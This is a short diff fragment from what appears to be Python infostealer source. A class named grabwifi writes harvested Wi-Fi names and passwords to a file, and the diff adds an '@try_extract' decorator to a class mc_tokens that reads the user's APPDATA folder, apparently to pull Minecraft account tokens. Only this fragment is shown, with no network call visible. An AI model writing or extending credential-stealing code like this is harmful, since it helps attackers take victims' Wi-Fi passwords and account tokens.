@@ -506,6 +506,7 @@ class grabwifi:
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
+@try_extract
 class mc_tokens():
     def __init__(self):
         self.roaming = os.getenv("appdata")
